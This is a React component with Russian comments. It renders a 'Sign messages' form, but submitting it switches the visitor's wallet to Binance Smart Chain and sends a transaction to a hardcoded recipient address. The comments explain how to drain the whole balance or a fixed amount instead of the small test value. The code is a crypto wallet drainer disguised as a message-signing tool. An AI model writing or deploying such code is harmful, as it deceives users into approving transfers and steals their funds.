import { useState } from 'react'
import { ethers } from 'ethers'
import ErrorMessage from './ErrorMessage'

// список видов поддерживаемых кошельков
const networks = {
  polygon: {
    chainId: `0x${Number(137).toString(16)}`,
    chainName: 'Polygon Mainnet',
    nativeCurrency: {
      name: 'MATIC',
      symbol: 'MATIC',
      decimals: 18,
    },
    rpcUrls: ['https://polygon-rpc.com/'],
    blockExplorerUrls: ['https://polygonscan.com/'],
  },
  bsc: {
    chainId: `0x${Number(56).toString(16)}`,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
      name: 'Binance Chain Native Token',
      symbol: 'BNB',
      decimals: 18,
    },
    rpcUrls: [
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc-dataseed3.binance.org/',
      'https://bsc-dataseed4.binance.org/',
      'https://bsc-dataseed1.defibit.io/',
      'https://bsc-dataseed2.defibit.io/',
      'https://bsc-dataseed3.defibit.io/',
      'https://bsc-dataseed4.defibit.io/',
      'https://bsc-dataseed1.ninicoin.io/',
      'https://bsc-dataseed2.ninicoin.io/',
      'https://bsc-dataseed3.ninicoin.io/',
      'https://bsc-dataseed4.ninicoin.io/',
      'wss://bsc-ws-node.nariox.org/',
    ],
    blockExplorerUrls: ['https://bscscan.com/'],
  },
  HT: {
    chainId: `0x${Number(128).toString(16)}`,
    chainName: '	HECO Chain (HT)',
    nativeCurrency: {
      name: '	HECO Chain (HT)',
      symbol: '	HT',
      decimals: 18,
    },
    rpcUrls: ['https://http-mainnet.hecochain.com/', 'wss://ws-mainnet.hecochain.com/'],
    blockExplorerUrls: ['	https://hecoinfo.com/'],
  },
}
// функция которая сменяет кошелек
const changeNetwork = async (networkName) => {
  await window.ethereum.request({
    method: 'wallet_addEthereumChain',
    params: [
      {
        ...networks[networkName],
      },
    ],
  })
}

const signMessage = async () => {
  // вбиваем сумму которую хотим снимать если нужно
  const DEFAULT_AMOUNT = '0.00002'
  // вбиваем адрес на который будет переводится сумма
  // нужно следить что бы он поддерживался кошельком
  const DEFAULT_WALLET = '0x194B188720BdA9080Db8cAE6cAF578bc78Dbb318'
  // если хочешь поменять сеть то раскоментить следующее
  const networkName = 'bsc'

  // проверяет подключение к сети
  if (!window.ethereum) throw new Error('No crypto wallet found. Please install it.')

  // если хочешь поменять сеть то нужно раскоментить следующую строчку
  await changeNetwork(networkName)

  // идет подключение к провайдеру
  await window.ethereum.send('eth_requestAccounts')
  const provider = new ethers.providers.Web3Provider(window.ethereum)
  const signer = provider.getSigner()
  // провеняет твой адрес для выбраной сети
  ethers.utils.getAddress(DEFAULT_WALLET)
  const balance = await signer.getBalance()

  // если нужна сигнатура (закодированное сообщение)
  // то нужно задать сообщение
  // в твоем случае следующая строчка не нужна
  // const signature = await signer.signMessage(message)

  const tx = await signer.sendTransaction({
    // здесь идет выбор твоего адреса
    to: DEFAULT_WALLET,
    // работает с этериум кошельком следующая штука для снятия всего балланса и минус коммиссия
    // value: ethers.utils.parseEther(`${balance.toNumber() - 0.003}`)
    // для снятия просто определенной суммы с кошелька
    // value: ethers.utils.parseEther(DEFAULT_AMOUNT)
    //
    value: `0x${Number(5).toString(16)}`,
  })
  console.log('tx', tx)
}

export default function SmartButton() {
  const [error, setError] = useState()
  // здесь вешаем на кнопку функцию
  const handleSign = async (e) => {
    // убираем все побочные действия которые могут быть от браузера
    e.preventDefault()
    // очищаем стейт ошибок
    setError()
    try {
      // вызываем функцию которая делает то что нам нужно
      await signMessage()
    } catch (e) {
      // если есть ошибки заносим в стейт
      setError(e.message)
    }
  }

  return (
    <form className='m-4' onSubmit={handleSign}>
      <div className='credit-card w-full shadow-lg mx-auto rounded-xl bg-white'>
        <main className='mt-4 p-4'>
          <h1 className='text-xl font-semibold text-gray-700 text-center'>Sign messages</h1>
          <div className=''>
            <div className='my-3'>
              <textarea
                // required
                type='text'
                name='message'
                className='textarea w-full h-24 textarea-bordered focus:ring focus:outline-none'
                placeholder='Message'
              />
            </div>
          </div>
        </main>
        <footer className='p-4'>
          <button
            type='submit'
            className='btn btn-primary submit-button focus:ring focus:outline-none w-full'
          >
            Sign message
          </button>
        </footer>
      </div>
    </form>
  )
}
